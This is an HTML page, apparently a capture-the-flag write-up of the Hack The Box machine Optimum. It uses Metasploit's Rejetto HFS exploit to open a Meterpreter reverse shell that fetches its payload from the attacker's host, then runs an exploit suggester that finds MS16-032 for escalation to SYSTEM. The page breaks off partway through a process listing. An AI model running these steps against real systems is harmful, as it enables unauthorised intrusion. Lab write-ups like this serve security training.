@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Optimum</strong></h1>
+        <em>Released: 18th March 2017 / Pwned: August 28th 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Optimum can be exploited using 2 CVEs: the 1st to exploit a web server and get a shell on the target system and the 2nd to elevated privileges to SYSTEM. Both CVEs have metasploit modules available for them. The exloit to get a user shell is reliable, but elevating to SYSTEM isn't. To get SYSTEM, I hopped outside of metasploit and ran the exploit manually.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.8</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/optimum#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/optimum#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.8<br>
+                ...<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;HttpFileServer&nbsp;httpd&nbsp;2.3<br>
+                |_http-server-header:&nbsp;HFS&nbsp;2.3<br>
+                |_http-title:&nbsp;HFS&nbsp;/<br>
+                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Aggressive&nbsp;OS&nbsp;guesses:&nbsp;Microsoft&nbsp;Windows&nbsp;Server&nbsp;2012&nbsp;or&nbsp;Windows&nbsp;Server&nbsp;2012&nbsp;R2&nbsp;(91%),&nbsp;...<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(test&nbsp;conditions&nbsp;non-ideal).<br>
+                Service&nbsp;Info:&nbsp;OS:&nbsp;Windows;&nbsp;CPE:&nbsp;cpe:/o:microsoft:windows<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <strong>Ports</strong><br>
+        • 80/http - A web server is running! And nmap says that it's a HttpFileServer, whatever that is.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http - Rejetto HttpFileServer</strong></h2><br>
+        Visit the website at <code>http://10.10.10.8</code><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        Googling for “HttpFileServer� reveals that this web server is made by <code>rejetto</code>.<br>
+        <br>
+        If you <code>searchsploit</code> for <code>rejetto</code>, you'll find a series of remote command execution exploits for <code>HttpFileServer</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/optimum#&nbsp;searchsploit&nbsp;rejetto<br>
+                ---------------------------------------------------&nbsp;----------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;(/usr/share/exploitdb/)<br>
+                ---------------------------------------------------&nbsp;----------------------------------------<br>
+                Rejetto&nbsp;HTTP&nbsp;File&nbsp;Server&nbsp;(HFS)&nbsp;-&nbsp;Remote&nbsp;Command&nbsp;Ex&nbsp;|&nbsp;exploits/windows/remote/34926.rb<br>
+                Rejetto&nbsp;HTTP&nbsp;File&nbsp;Server&nbsp;(HFS)&nbsp;1.5/2.x&nbsp;-&nbsp;Multiple&nbsp;&nbsp;|&nbsp;exploits/windows/remote/31056.py<br>
+                Rejetto&nbsp;HTTP&nbsp;File&nbsp;Server&nbsp;(HFS)&nbsp;2.2/2.3&nbsp;-&nbsp;Arbitrary&nbsp;|&nbsp;exploits/multiple/remote/30850.txt<br>
+                Rejetto&nbsp;HTTP&nbsp;File&nbsp;Server&nbsp;(HFS)&nbsp;2.3.x&nbsp;-&nbsp;Remote&nbsp;Comm&nbsp;|&nbsp;exploits/windows/remote/34668.txt<br>
+                Rejetto&nbsp;HTTP&nbsp;File&nbsp;Server&nbsp;(HFS)&nbsp;2.3.x&nbsp;-&nbsp;Remote&nbsp;Comm&nbsp;|&nbsp;exploits/windows/remote/39161.py<br>
+                Rejetto&nbsp;HTTP&nbsp;File&nbsp;Server&nbsp;(HFS)&nbsp;2.3a/2.3b/2.3c&nbsp;-&nbsp;Re&nbsp;|&nbsp;exploits/windows/webapps/34852.txt<br>
+                ---------------------------------------------------&nbsp;----------------------------------------<br>
+                Shellcodes:&nbsp;No&nbsp;Result
+            </div>
+        </div><br>
+        <br>
+        If you read through <code>exploits/windows/remote/39161.py</code>, you'll see that this spawns a shell by retrieving files off of a server/your attacking system.<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) exploit/windows/http/rejetto_hfs_exec</strong></h2><br>
+        Fortunately, there's a <code>metasploit</code> module for this exact exploit, which makes the whole process of getting a user shell fairly easy.<br>
+        <br>
+        Open metasploit with <code>msfconsole</code>, <code>search</code> for <code>rejetto</code> and load the exploit with <code>use</code>.<br>
+            <div class="codebox">
+                msf5&nbsp;&gt;&nbsp;search&nbsp;rejetto<br>
+                <br>
+                Matching&nbsp;Modules<br>
+                ================<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disclosure&nbsp;Date&nbsp;&nbsp;Rank&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Check&nbsp;&nbsp;Description<br>
+                &nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-----&nbsp;&nbsp;-----------<br>
+                &nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;exploit/windows/http/rejetto_hfs_exec&nbsp;&nbsp;2014-09-11&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;excellent&nbsp;&nbsp;Yes&nbsp;&nbsp;&nbsp;&nbsp;Rejetto&nbsp;HttpFileServer&nbsp;Remote&nbsp;Command&nbsp;Execution<br>
+                <br>
+                <br>
+                msf5&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/http/rejetto_hfs_exec&nbsp;<br>
+                msf5&nbsp;exploit(windows/http/rejetto_hfs_exec)&nbsp;&gt;&nbsp;show&nbsp;options<br>
+                <br>
+                Module&nbsp;options&nbsp;(exploit/windows/http/rejetto_hfs_exec):<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description<br>
+                &nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------<br>
+                &nbsp;&nbsp;&nbsp;HTTPDELAY&nbsp;&nbsp;10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Seconds&nbsp;to&nbsp;wait&nbsp;before&nbsp;terminating&nbsp;web&nbsp;server<br>
+                &nbsp;&nbsp;&nbsp;Proxies&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;proxy&nbsp;chain&nbsp;of&nbsp;format&nbsp;type:host:port[,type:host:port][...]<br>
+                &nbsp;&nbsp;&nbsp;RHOSTS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;address&nbsp;range&nbsp;or&nbsp;CIDR&nbsp;identifier<br>
+                &nbsp;&nbsp;&nbsp;RPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;port&nbsp;(TCP)<br>
+                &nbsp;&nbsp;&nbsp;SRVHOST&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;local&nbsp;host&nbsp;to&nbsp;listen&nbsp;on.&nbsp;This&nbsp;must&nbsp;be&nbsp;an&nbsp;address&nbsp;on&nbsp;the&nbsp;local&nbsp;machine&nbsp;or&nbsp;0.0.0.0<br>
+                &nbsp;&nbsp;&nbsp;SRVPORT&nbsp;&nbsp;&nbsp;&nbsp;8080&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;local&nbsp;port&nbsp;to&nbsp;listen&nbsp;on.<br>
+                &nbsp;&nbsp;&nbsp;SSL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Negotiate&nbsp;SSL/TLS&nbsp;for&nbsp;outgoing&nbsp;connections<br>
+                &nbsp;&nbsp;&nbsp;SSLCert&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Path&nbsp;to&nbsp;a&nbsp;custom&nbsp;SSL&nbsp;certificate&nbsp;(default&nbsp;is&nbsp;randomly&nbsp;generated)<br>
+                &nbsp;&nbsp;&nbsp;TARGETURI&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;path&nbsp;of&nbsp;the&nbsp;web&nbsp;application<br>
+                &nbsp;&nbsp;&nbsp;URIPATH&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;URI&nbsp;to&nbsp;use&nbsp;for&nbsp;this&nbsp;exploit&nbsp;(default&nbsp;is&nbsp;random)<br>
+                &nbsp;&nbsp;&nbsp;VHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HTTP&nbsp;server&nbsp;virtual&nbsp;host<br>
+                <br>
+                <br>
+                Exploit&nbsp;target:<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name<br>
+                &nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----<br>
+                &nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Automatic
+            </div>
+        </div><br>
+        <br>
+        <code>set</code> the target IP, <code>set</code> the server host to the IP of your attacking machine and <code>set</code> a server port for the server to listen on.<br>
+            <div class="codebox">
+                msf5&nbsp;exploit(windows/http/rejetto_hfs_exec)&nbsp;&gt;&nbsp;set&nbsp;RHOSTS&nbsp;10.10.10.8<br>
+                RHOSTS&nbsp;=&gt;&nbsp;10.10.10.8<br>
+                msf5&nbsp;exploit(windows/http/rejetto_hfs_exec)&nbsp;&gt;&nbsp;set&nbsp;SRVHOST&nbsp;10.10.14.8<br>
+                SRVHOST&nbsp;=&gt;&nbsp;10.10.14.8<br>
+                msf5&nbsp;exploit(windows/http/rejetto_hfs_exec)&nbsp;&gt;&nbsp;set&nbsp;SRVPORT&nbsp;9001<br>
+                SRVPORT&nbsp;=&gt;&nbsp;9001
+            </div>
+        </div><br>
+        <br>
+        Run the exploit with <code>exploit</code>.<br>
+        A TCP handler should launch and a meterpreter session will open on your system.<br>
+        You have a shell.<br>
+            <div class="codebox">
+                msf5&nbsp;exploit(windows/http/rejetto_hfs_exec)&nbsp;&gt;&nbsp;exploit<br>
+                <br>
+                [*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.10.14.8:4444&nbsp;<br>
+                [*]&nbsp;Using&nbsp;URL:&nbsp;http://10.10.14.8:9001/bnHVMkGNN<br>
+                [*]&nbsp;Server&nbsp;started.<br>
+                [*]&nbsp;Sending&nbsp;a&nbsp;malicious&nbsp;request&nbsp;to&nbsp;/<br>
+                [*]&nbsp;Payload&nbsp;request&nbsp;received:&nbsp;/bnHVMkGNN<br>
+                [*]&nbsp;Sending&nbsp;stage&nbsp;(179779&nbsp;bytes)&nbsp;to&nbsp;10.10.10.8<br>
+                [*]&nbsp;Meterpreter&nbsp;session&nbsp;1&nbsp;opened&nbsp;(10.10.14.8:4444&nbsp;-&gt;&nbsp;10.10.10.8:49162)&nbsp;at&nbsp;2019-08-27&nbsp;21:53:47&nbsp;+0100<br>
+                [!]&nbsp;Tried&nbsp;to&nbsp;delete&nbsp;%TEMP%\cAjZznLUxGMBW.vbs,&nbsp;unknown&nbsp;result<br>
+                [*]&nbsp;Server&nbsp;stopped.<br>
+                <br>
+                meterpreter&nbsp;&gt;&nbsp;sysinfo<br>
+                Computer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;OPTIMUM<br>
+                OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Windows&nbsp;2012&nbsp;R2&nbsp;(Build&nbsp;9600).<br>
+                Architecture&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x64<br>
+                System&nbsp;Language&nbsp;:&nbsp;el_GR<br>
+                Domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;HTB<br>
+                Logged&nbsp;On&nbsp;Users&nbsp;:&nbsp;1<br>
+                Meterpreter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x86/windows<br>
+                meterpreter&nbsp;&gt;&nbsp;getuid<br>
+                Server&nbsp;username:&nbsp;OPTIMUM\kostas
+            </div>
+        </div><br>
+        <br>
+        From the output of <code>sysinfo</code>, OPTIMUM is a 64-bit machine and we have a meterpreter session that's running as 32-bit.<br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) local_exploit_suggester</strong></h2><br>
+        If you have a meterpreter shell on a target Windows system and are at the priv-esc stage, it's a good idea to run metasploit's <code>local_exploit_suggester</code> module, which will read the meterpreter session architecture of your shell on the target system and find exploits for it.<br>
+        <br>
+        <code>local_exploit_suggester</code> on 32-bit sessions will reliably find exploits.<br>
+        <code>local_exploit_suggester</code> on 64-bit sessions isn't reliable at all (primarily becasue there aren't many 64-bit metasploit Windows exploits that have a ‘check’ function).<br>
+        <br>
+        Run <code>local_exploit_suggester</code> against both a 32-bit session and a 64-bit session.<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>4a) 32-bit local_exploit_suggester</strong></h2><br>
+        First, run <code>local_exploit_suggester</code> against the initial 32-bit meterpreter session we spawned.<br>
+        <code>background</code> the meterpreter session, <code>use post/multi/recon/local_exploit_suggester</code> and <code>set</code> the SESSION to run the exploit suggester on to that of your meterpreter session.<br>
+            <div class="codebox">
+                meterpreter&nbsp;&gt;&nbsp;background<br>
+                [*]&nbsp;Backgrounding&nbsp;session&nbsp;1...<br>
+                msf5&nbsp;exploit(windows/http/rejetto_hfs_exec)&nbsp;&gt;&nbsp;use&nbsp;post/multi/recon/local_exploit_suggester&nbsp;<br>
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;set&nbsp;SESSION&nbsp;1<br>
+                SESSION&nbsp;=&gt;&nbsp;1<br>
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;run<br>
+                <br>
+                [*]&nbsp;10.10.10.8&nbsp;-&nbsp;Collecting&nbsp;local&nbsp;exploits&nbsp;for&nbsp;x86/windows...<br>
+                [*]&nbsp;10.10.10.8&nbsp;-&nbsp;29&nbsp;exploit&nbsp;checks&nbsp;are&nbsp;being&nbsp;tried...<br>
+                [+]&nbsp;10.10.10.8&nbsp;-&nbsp;exploit/windows/local/bypassuac_eventvwr:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [+]&nbsp;10.10.10.8&nbsp;-&nbsp;exploit/windows/local/ms16_032_secondary_logon_handle_privesc:&nbsp;The&nbsp;target&nbsp;service&nbsp;is&nbsp;running,&nbsp;but&nbsp;could&nbsp;not&nbsp;be&nbsp;validated.<br>
+                [*]&nbsp;Post&nbsp;module&nbsp;execution&nbsp;completed
+            </div>
+        </div><br>
+        <br>
+        2 exploits have been found:<br>
+        • <code>exploit/windows/local/bypassuac_eventvwr</code> - This is a UAC bypass, which isn't of interest<br>
+        • <code>exploit/windows/local/ms16_032_secondary_logon_handle_privesc</code> - This is interesting, and what we want.<br>
+        <br>
+        MS16-032 is the exploit that will get us SYSTEM shell.<br>
+        <br>
+        For the sake of thorough enumeration, check for exploits against a 64-bit meterpreter session as well.<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>4b) 64-bit local_exploit_suggester</strong></h2><br>
+        First, we need to set our meterpreter session to 64-bit by migrating to a 64-bit process.<br>
+        <br>
+        Switch to your meterpreter session with <code>sessions -i &lt;session number&gt;</code> and run <code>ps</code> to list 64-bit processes on the target machine.<br>
+            <div class="codebox">
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;sessions&nbsp;-i&nbsp;1<br>
+                meterpreter&nbsp;&gt;&nbsp;ps<br>
+                <br>
+                Process&nbsp;List<br>
+                ============<br>
+                <br>
+                &nbsp;PID&nbsp;&nbsp;&nbsp;PPID&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Arch&nbsp;&nbsp;Session&nbsp;&nbsp;User&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Path<br>
+                &nbsp;---&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;-------&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----<br>
+                &nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[System&nbsp;Process]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;232&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;smss.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;240&nbsp;&nbsp;&nbsp;1424&nbsp;&nbsp;mDvZfDUEhLf.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPTIMUM\kostas&nbsp;&nbsp;C:\Users\kostas\AppData\Local\Temp\rad26F3E.tmp\mDvZfDUEhLf.exe<br>
+                &nbsp;340&nbsp;&nbsp;&nbsp;332&nbsp;&nbsp;&nbsp;csrss.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;392&nbsp;&nbsp;&nbsp;332&nbsp;&nbsp;&nbsp;wininit.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;404&nbsp;&nbsp;&nbsp;384&nbsp;&nbsp;&nbsp;csrss.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;448&nbsp;&nbsp;&nbsp;384&nbsp;&nbsp;&nbsp;winlogon.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;488&nbsp;&nbsp;&nbsp;392&nbsp;&nbsp;&nbsp;services.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
